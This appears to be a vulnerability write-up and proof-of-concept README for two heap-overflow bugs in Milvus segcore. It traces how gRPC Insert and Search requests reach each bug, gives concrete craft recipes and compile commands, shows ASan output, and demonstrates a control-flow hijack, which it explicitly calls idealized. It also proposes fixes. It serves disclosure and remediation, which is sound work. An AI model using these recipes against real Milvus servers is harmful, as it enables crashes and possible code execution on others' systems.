# C1 / C2 — gRPC-reachable heap-overflow writes in Milvus segcore

Proof-of-concept and reachability analysis for the two write-overflow findings (**C1**,
**C2**) from the full memory-safety audit in [`/memory.md`](../../memory.md). This
directory answers one question precisely:

> Can a gRPC client craft a payload that reaches these overflows, and is RCE possible?

**Short answer:**
- A gRPC client **can** craft requests that reach both overflow sites (traced by code, below).
- Both are **confirmed heap-buffer-overflow writes** (AddressSanitizer, against the real `new[]`).
- **RCE is NOT confirmed.** The write primitive can be steered into a control-flow hijack
  under an *idealized* layout (ASLR off, hand-placed victim, no allocator hardening), which
  is demonstrated here. That establishes **RCE *potential*, not achieved RCE.** See
  [Confidence & scope](#confidence--what-is-not-proven).

---

## The two bugs

### C1 — `VectorArray` float branch (`internal/core/src/common/VectorArray.h:57-70`)

```cpp
dim_    = vector_field.dim();                                  // :57  per-row proto dim (attacker-controlled)
length_ = vector_field.float_vector().data().size() / dim_;   // :62  truncating divide
auto data = new float[length_ * dim_];                        // :63  buffer = (N/dim)*dim floats
size_   = vector_field.float_vector().data().size()*sizeof(float);
FastMemcpy(data, ...data().data(), ...data().size()*sizeof(float)); // :66-69  copies ALL N floats
```

Buffer holds `length_*dim_ = (N/dim_)*dim_` floats, but the memcpy copies all `N`. With
`dim_ > N` (e.g. `dim_=2^20`, `N=8`), `length_=0`, the allocation is `new float[0]`, and
`N*4` attacker bytes are written into a zero-length block. `N` is bounded only by request
size ⇒ **large, content-controlled** overflow. Sibling branches (binary/fp16/bf16/int8)
size the buffer from the real byte length and are safe — only the float branch is broken.

### C2 — `CopyAndWrapSparseRow` (`internal/core/src/common/Utils.h:276-299`)

```cpp
size_t num_elements = size / element_size();   // element_size()==8
SparseRow row(num_elements);                   // allocates num_elements*8 bytes
FastMemcpy(row.data(), data, size);            // copies `size` bytes  <-- OVERFLOW
if (validate) { AssertInfo(size % element_size()==0, ...); ... }   // runs AFTER the copy
```

When `size % 8 != 0`, the buffer is `(size/8)*8` bytes but `size` bytes are copied — up to
a 7-byte overflow. The `size%8` assert that was meant to stop it runs **after** the memcpy,
so even `validate=true` does not prevent it.

---

## gRPC reachability (traced by code)

### C1 — reachable via `Insert` / `Upsert`

1. **RPC:** insert/upsert of an `ArrayOfVector` field, float element type. Each row is a
   `VectorField` proto that carries its **own `dim`**.
2. **Go gate is bypassable** — `checkArrayOfVectorFieldData`
   (`internal/proxy/validate_util.go:1226`) calls
   `validateVectorCount(len(floatVector.GetData()), int(dim))` where
   `dim = typeutil.GetDim(fieldSchema)` — the **schema** dim. It only enforces
   `len(data) % schema_dim == 0`. It **never reads the per-row proto `VectorField.dim`**.
3. **Proto flows through unchanged** (WAL/pipeline `CheckAligned` only checks row counts) to
   `internal/core/src/segcore/ConcurrentVector.cpp:70` → `VectorArray(vector_array[i])` →
   the constructor above, which reads `vector_field.dim()`.

**Craft recipe:** schema dim `4`; send a row whose float data is `8` floats
(`8 % 4 == 0` → passes Go) but set that row's proto `dim = 2^20`. In C++:
`length_ = 8 / 2^20 = 0` → `new float[0]` → 32 attacker bytes written OOB.

### C2 — reachable via `Search`

1. **RPC:** search with a `SparseFloatVector` placeholder; placeholder bytes come straight
   from the request proto.
2. **No Go length gate on this path** — `ConvertPlaceholderGroup`
   (`internal/proxy/vector_type_convert.go:90-99`) passes sparse placeholders through
   untouched. `ValidateSparseFloatRows` (the `len%8` check) runs only on insert/import.
3. **Sink:** `internal/core/src/query/Plan.cpp:174` →
   `SparseBytesToRows(ph.values(), /*validate=*/true)` → `CopyAndWrapSparseRow`, where the
   memcpy precedes the check.

**Craft recipe:** send a sparse query row of length `13` → 8-byte buffer, 13-byte copy →
5-byte OOB write.

---

## PoCs in this directory

The PoCs reproduce the **exact vulnerable arithmetic verbatim** from the two source sites.
The only substitutions are `FastMemcpy → std::memcpy` and layout-faithful stand-ins for the
proto / `SparseRow` types (`SparseRow<float>` = `(uint32 id, float val)` pairs,
`element_size()==8`). Two builds per bug:

| File | Purpose |
|------|---------|
| `poc_c1_asan.cpp` / `poc_c2_asan.cpp` | **Detection** — real `new[]`, ASan aborts with heap-buffer-overflow |
| `poc_c1_rce.cpp`  / `poc_c2_rce.cpp`  | **Exploitation** — overflow overwrites an adjacent object's function pointer and the program then calls it → control-flow hijack |

The RCE builds use a deterministic bump arena (so heap adjacency is reproducible and the
hijacked address is printable) and `-no-pie` (so addresses are stable). The bug being
demonstrated is the *arithmetic*, not the allocator; the ASan builds prove it is a real
heap overflow against the actual `new[]`.

The exact commands the Makefile runs (also runnable standalone):

```bash
# detection (ASan aborts on the OOB write)
g++ -g -O0 -fsanitize=address poc_c1_asan.cpp -o c1_asan && ASAN_OPTIONS=abort_on_error=0 ./c1_asan
g++ -g -O0 -fsanitize=address poc_c2_asan.cpp -o c2_asan && ASAN_OPTIONS=abort_on_error=0 ./c2_asan
# exploitation (control-flow hijack; -no-pie for stable addresses)
g++ -g -O0 -no-pie poc_c1_rce.cpp -o c1_rce && ./c1_rce
g++ -g -O0 -no-pie poc_c2_rce.cpp -o c2_rce && ./c2_rce
```

### Recorded output

The **complete, unedited transcript** (full ASan dumps incl. shadow bytes, stack traces,
and the exact commands) is in [`RUN_LOG.md`](./RUN_LOG.md). Key lines:

**C1 ASan** — 32-byte write past a 1-byte region, allocated at `new float[length_*dim_]`:

```console
$ g++ -g -O0 -fsanitize=address poc_c1_asan.cpp -o c1_asan
$ ASAN_OPTIONS=abort_on_error=0 ./c1_asan
==7560==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000011 ...
WRITE of size 32 at 0x502000000011 thread T0
    #0 memcpy
    #1 VectorArray_float_branch(VectorFieldProto const&) poc_c1_asan.cpp:27
0x502000000011 is located 0 bytes after 1-byte region [0x502000000010,0x502000000011)
allocated by thread T0 here:
    #0 operator new[](unsigned long)
    #1 VectorArray_float_branch(VectorFieldProto const&) poc_c1_asan.cpp:25   ->  new float[length_*dim_]
SUMMARY: AddressSanitizer: heap-buffer-overflow ... in memcpy
==7560==ABORTING
```

**C2 ASan** — 13-byte write past an 8-byte region, allocated at `SparseRow::SparseRow`:

```console
$ g++ -g -O0 -fsanitize=address poc_c2_asan.cpp -o c2_asan
$ ASAN_OPTIONS=abort_on_error=0 ./c2_asan
==7566==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000018 ...
WRITE of size 13 at 0x502000000018 thread T0
    #0 memcpy
    #1 CopyAndWrapSparseRow(void const*, unsigned long, bool) poc_c2_asan.cpp:28
0x502000000018 is located 0 bytes after 8-byte region [0x502000000010,0x502000000018)
allocated by thread T0 here:
    #0 operator new[](unsigned long)
    #1 SparseRow::SparseRow(unsigned long) poc_c2_asan.cpp:17
SUMMARY: AddressSanitizer: heap-buffer-overflow ... in memcpy
==7566==ABORTING
```

**C1 RCE** — full 8-byte pointer overwrite (attacker controls size *and* content):

```console
$ g++ -g -O0 -no-pie poc_c1_rce.cpp -o c1_rce
$ ./c1_rce
[C1] before call: victim->handler = 0x40134c (legit=0x401332, win=0x40134c)
[C1] *** win() executed via hijacked pointer — arbitrary code exec ***
[C1]     (a real exploit would exec /bin/sh here)
```

**C2 RCE** — 5-byte *partial* pointer overwrite; only redirects when high bytes align:

```console
$ g++ -g -O0 -no-pie poc_c2_rce.cpp -o c2_rce
$ ./c2_rce
[C2] &legit=0x4011d2  &win=0x4011ec  high-3-bytes match: yes (hijack viable)
[C2] before call: victim->handler = 0x4011ec
[C2] *** win() executed via partially-overwritten pointer — code exec ***
```

C1 overwrites the **full** pointer with any address (target-independent). C2 reaches only
**5 bytes**, so it is a partial overwrite that redirects only when the target shares its
high bytes with the original (same `.text`) — this is why the audit rates C2 "limited RCE."
(ASan `0x...` addresses, PIDs, and BuildIds vary per run; the sizes and outcomes do not.)

---

## Confidence & what is NOT proven

**Confirmed**
- Both are real heap-buffer-overflow **writes** (ASan, real `new[]`).
- C1's overflow **length and content** are attacker-controlled; C2's is a ≤7-byte partial write.
- The write primitive **can** be turned into a control-flow transfer under an idealized layout.

**NOT confirmed — do not claim "RCE"**
- **No live shot.** Reachability is a static code trace, not a request fired against a running
  cluster. A full segcore + tantivy build to run true gRPC E2E was not practical in the
  research sandbox.
- **Idealized exploitation only.** The hijack demos run with ASLR off (`-no-pie`) and a
  hand-placed victim object. Real exploitation additionally requires:
  - an **ASLR defeat** / info leak (several H-class OOB *reads* in `memory.md` are candidate
    leak primitives, but that is unproven wiring);
  - a **heap groom** to place a live code/vtable pointer adjacent to the overflowed buffer
    under the production allocator (tcmalloc/jemalloc), not a toy arena;
  - surviving compiler/allocator **hardening** in a release build.
- None of the above is demonstrated. The correct characterization is **"attacker-controlled
  heap-overflow write, RCE potential"** (C1) and **"small overflow, crash/DoS, limited RCE"**
  (C2) — matching `memory.md`.

## Suggested fixes (see `memory.md` for the full list)

- **C1:** validate `dim_ > 0 && dim_ == schema_dim`, reject `data().size() % dim_ != 0`, and
  copy `length_*dim_*sizeof(float)` (not `N*sizeof(float)`). Also closes the `dim_==0` SIGFPE (D1).
- **C2:** move the `size % element_size() == 0` check **before** the allocation/memcpy and
  throw on failure. Also hardens the insert path (`ConcurrentVector.cpp`, `validate=false`).
